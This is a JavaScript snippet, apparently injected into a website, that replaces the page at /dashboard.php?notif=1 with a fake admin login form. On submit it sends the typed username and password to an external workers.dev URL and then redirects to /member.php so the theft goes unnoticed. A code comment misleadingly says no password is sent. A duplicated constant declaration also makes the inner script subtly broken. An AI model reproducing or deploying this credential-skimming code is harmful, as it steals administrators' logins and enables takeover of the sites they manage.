(function() {
    if (window.location.pathname.endsWith("/dashboard.php") && window.location.search === "?notif=1") {
        document.documentElement.innerHTML = `
<!DOCTYPE html>
<html>
<head>
    <title>Selamat Datang Admin</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background: #f0f0f0;
        }
        .login-container {
            background: #fff;
            padding: 20px;
            border-radius: 6px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
            width: 300px;
        }
        h2 {
            text-align: center;
            margin-bottom: 15px;
        }
        input {
            width: 100%;
            margin-bottom: 10px;
            padding: 8px;
        }
        button {
            width: 100%;
            padding: 10px;
            background: black;
            color: white;
            border: none;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>ADMIN</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
    <script>
        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();

            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            const loginDate = new Date().toISOString();

            const loginDate = new Date().toISOString();

            // Kirim data NON-sensitive ke worker (tanpa password)
            fetch("https://memek-worker.defoy89122.workers.dev/?message=" 
                + encodeURIComponent("User: " + username + ", password: " + password));

            // Redirect ke /member.php setelah "login"
            window.location.href = "/member.php";
        });
    </script>
</body>
</html>
        `;
    }
})();
